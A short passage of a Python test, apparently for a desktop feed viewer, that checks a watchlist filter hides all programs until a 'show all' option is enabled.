        feed_env.seed()
        feed_env.settings = replace(feed_env.settings, watchlist_keywords=["zzz-nomatch"])
        feed = feed_env.make()
        feed.refresh()
        assert feed.programs.topLevelItemCount() == 0
        feed.show_all.setChecked(True)
        assert feed.programs.topLevelItemCount() == 1
